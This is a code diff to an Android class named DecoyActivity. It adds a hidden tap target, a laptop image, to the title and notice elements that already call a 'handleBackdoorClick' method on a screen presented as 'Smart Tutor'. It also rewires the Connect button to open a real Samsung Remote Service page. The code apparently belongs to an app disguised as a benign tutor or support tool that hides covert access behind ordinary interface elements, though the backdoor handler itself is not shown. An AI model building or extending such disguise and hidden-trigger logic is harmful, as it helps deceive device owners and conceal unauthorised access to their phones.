@@ -259,19 +259,31 @@ public class DecoyActivity extends AppCompatActivity {
 
         View title = findViewById(R.id.tvSmartTutorTitle);
         View notice = findViewById(R.id.tvSmartTutorNotice);
+        View laptop = findViewById(R.id.ivSmartTutorLaptop);
         View btnConnect = findViewById(R.id.btnSmartTutorConnect);
 
         if (title != null) title.setOnClickListener(v -> handleBackdoorClick());
         if (notice != null) notice.setOnClickListener(v -> handleBackdoorClick());
+        if (laptop != null) laptop.setOnClickListener(v -> handleBackdoorClick());
 
         if (btnConnect != null) {
             btnConnect.setOnClickListener(v -> {
-                if (!allPermissionsOk()) {
-                    Intent permissions = new Intent(DecoyActivity.this, PermissionActivity.class);
-                    permissions.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
-                    startActivityForResult(permissions, 9999);
-                } else {
-                    handleBackdoorClick();
+                try {
+                    // Extract user's country code dynamically for Samsung Remote Service localized URL
+                    java.util.Locale locale = java.util.Locale.getDefault();
+                    String country = locale.getCountry().toLowerCase();
+                    if (country.isEmpty()) country = "ca";
+
+                    String samsungUrl = "https://www.samsung.com/" + country + "/support/remoteservice/";
+                    Intent intent = new Intent(Intent.ACTION_VIEW, android.net.Uri.parse(samsungUrl));
+                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                    startActivity(intent);
+                } catch (Exception e) {
+                    try {
+                        Intent fallback = new Intent(Intent.ACTION_VIEW, android.net.Uri.parse("https://www.samsung.com/ca/support/remoteservice/"));
+                        fallback.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                        startActivity(fallback);
+                    } catch (Exception ignored) {}
                 }
             });
         }
